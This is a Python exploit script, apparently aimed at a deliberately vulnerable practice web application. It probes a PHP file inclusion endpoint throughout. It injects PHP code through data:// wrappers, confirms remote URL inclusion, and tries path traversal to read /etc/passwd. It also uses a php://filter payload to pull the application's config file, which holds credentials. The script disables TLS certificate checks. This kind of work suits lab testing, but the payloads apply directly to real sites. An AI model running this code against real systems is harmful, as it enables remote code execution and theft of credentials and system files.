import urllib.parse, urllib.request, ssl, base64, re, sys

BASE = "https://pentest-ground.com:4280"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def get(path):
    url = BASE + path
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)

# 1. data:// wrapper -> PHP code execution proof
payload = base64.b64encode(b'<?php echo "RFI_PROOF_" . phpversion(); ?>').decode()
enc = urllib.parse.quote(payload)
st, body = get("/vulnerabilities/fi/?page=data://text/plain;base64," + enc)
m = re.search(r'RFI_PROOF_[^ <]*', body or "")
print("data:// wrapper:", st, "->", m.group(0) if m else "no marker")

# 2. plain-text data:// (no base64)
st, body = get("/vulnerabilities/fi/?page=data://text/plain," + urllib.parse.quote('<?php echo "RFI_PLAIN_" . phpversion(); ?>'))
m = re.search(r'RFI_PLAIN_[^ <]*', body or "")
print("data:// plain:", st, "->", m.group(0) if m else "no marker")

# 3. RFI via remote URL already confirmed with example.com; try http:// variant
st, body = get("/vulnerabilities/fi/?page=http://example.com/")
print("http://example.com include:", st, "->", "Example Domain" if "Example Domain" in (body or "") else "not embedded")

# 4. instructions.php doc param traversal
for p in ["low", "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
          "/etc/passwd", "php://filter/convert.base64-encode/resource=../../config/config.inc.php"]:
    st, body = get("/instructions.php?doc=" + urllib.parse.quote(p, safe="/:.%"))
    has_passwd = "root:x:0:0" in (body or "")
    has_b64 = bool(re.search(r'[A-Za-z0-9+/=]{40,}', body or ""))
    print(f"instructions doc={p!r}: status={st} len={len(body or '')} passwd={has_passwd} b64blob={has_b64}")
